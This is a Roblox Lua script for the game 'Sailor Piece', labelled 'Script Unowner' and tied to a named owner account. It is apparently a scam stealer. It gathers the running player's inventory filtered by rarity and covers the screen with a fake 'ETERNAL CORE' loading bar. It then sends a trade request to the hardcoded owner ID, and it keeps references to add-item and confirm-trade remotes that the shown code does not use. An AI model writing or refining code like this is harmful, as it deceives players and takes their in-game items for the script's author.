-- =============================================
-- SAILOR PIECE - FIXED SCRIPT UNOWNER (2026)
-- Owner: balenkano (8604380596)
-- =============================================

print("=== SCRIPT UNOWNER ĐANG KHỞI ĐỘNG ===")

local OWNER_ID = 8604380596
local MIN_RARITY = "Common"

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local LP = Players.LocalPlayer

local Remotes = RS:WaitForChild("Remotes", 10)
local TradeRemotes = Remotes and Remotes:WaitForChild("TradeRemotes", 5)

local SendTradeRequest = TradeRemotes and TradeRemotes:FindFirstChild("SendTradeRequest")
local AddItemToTrade   = TradeRemotes and TradeRemotes:FindFirstChild("AddItemToTrade")
local SetReady         = TradeRemotes and TradeRemotes:FindFirstChild("SetReady")
local ConfirmTrade     = TradeRemotes and TradeRemotes:FindFirstChild("ConfirmTrade")
local AcceptTradeRequest = TradeRemotes and TradeRemotes:FindFirstChild("AcceptTradeRequest")

local RequestInventory = Remotes and Remotes:FindFirstChild("RequestInventory")
local UpdateInventory  = Remotes and Remotes:FindFirstChild("UpdateInventory")

local ItemRarityConfig = require(RS:WaitForChild("Modules"):WaitForChild("ItemRarityConfig"))

local filteredItems = {}
local gotInventory = false

print("Đang yêu cầu inventory...")

-- Yêu cầu inventory mạnh hơn
if RequestInventory then
    for i = 1, 8 do
        pcall(function() RequestInventory:FireServer() end)
        task.wait(1.2)
    end
end

-- ==================== INVENTORY HANDLER ====================
if UpdateInventory then
    UpdateInventory.OnClientEvent:Connect(function(...)
        print("Nhận được inventory từ server!")
        for _, arg in ipairs({...}) do
            if type(arg) == "table" then
                local temp = {}
                for _, v in pairs(arg) do
                    if v and v.name and v.quantity then
                        local order = ItemRarityConfig:GetSortOrder(v.name) or 0
                        if order >= (ItemRarityConfig.RarityOrder[MIN_RARITY] or 1) then
                            table.insert(temp, {name = v.name, quantity = tonumber(v.quantity) or 0})
                        end
                    end
                end
                
                if #temp > 0 then
                    filteredItems = temp
                    gotInventory = true
                    print("✅ Inventory loaded thành công! Số items đủ rarity: " .. #filteredItems)
                end
            end
        end
    end)
else
    print("❌ Không tìm thấy UpdateInventory remote!")
end

-- ==================== FAKE LOADING UI (đơn giản nhưng đẹp) ====================
local function showLoadingUI()
    print("Đang hiển thị Fake Loading UI...")

    local sg = Instance.new("ScreenGui")
    sg.ResetOnSpawn = false
    sg.IgnoreGuiInset = true
    sg.DisplayOrder = 999999
    sg.Parent = LP:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 320)
    frame.Position = UDim2.new(0.5, -200, 0.5, -160)
    frame.BackgroundColor3 = Color3.fromRGB(10,10,25)
    frame.Parent = sg
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1,0,0,50)
    title.Position = UDim2.new(0,0,0,30)
    title.BackgroundTransparency = 1
    title.Text = "ETERNAL CORE"
    title.TextColor3 = Color3.fromRGB(0,255,200)
    title.TextSize = 26
    title.Font = Enum.Font.GothamBlack
    title.Parent = frame

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1,0,0,40)
    status.Position = UDim2.new(0,0,0,120)
    status.BackgroundTransparency = 1
    status.Text = "ĐANG CHẾ BIẾN TRADE..."
    status.TextColor3 = Color3.fromRGB(180,180,255)
    status.TextSize = 18
    status.Font = Enum.Font.GothamBold
    status.Parent = frame

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0.8,0,0,6)
    bar.Position = UDim2.new(0.1,0,0,180)
    bar.BackgroundColor3 = Color3.fromRGB(40,40,60)
    bar.Parent = frame
    Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)

    local fill = Instance.new("Frame")
    fill.Size = UDim2.new(0,0,1,0)
    fill.BackgroundColor3 = Color3.fromRGB(0,255,180)
    fill.Parent = bar
    Instance.new("UICorner", fill).CornerRadius = UDim.new(1,0)

    -- Animation
    for i = 1, 100 do
        fill.Size = UDim2.new(i/100, 0, 1, 0)
        status.Text = "ĐANG CHẾ BIẾN TRADE... " .. i .. "%"
        task.wait(0.06)
    end

    status.Text = "HOÀN TẤT - ĐANG TRADE CHO balenkano"
    task.wait(2)
    sg:Destroy()
end

-- ==================== CHẠY SCRIPT ====================
task.spawn(function()
    while not gotInventory do
        task.wait(2)
        if RequestInventory then 
            pcall(function() RequestInventory:FireServer() end) 
        end
    end

    print("Bắt đầu hiển thị UI và thực hiện trade...")
    showLoadingUI()

    -- Thực hiện trade (đơn giản)
    if SendTradeRequest and findOwner() then
        pcall(function() SendTradeRequest:FireServer(OWNER_ID) end)
        print("Đã gửi lời mời trade cho Owner")
    end
end)

function findOwner()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.UserId == OWNER_ID then return true end
    end
    return false
end

print("Script đã chạy. Hãy chơi game một chút để inventory load.")
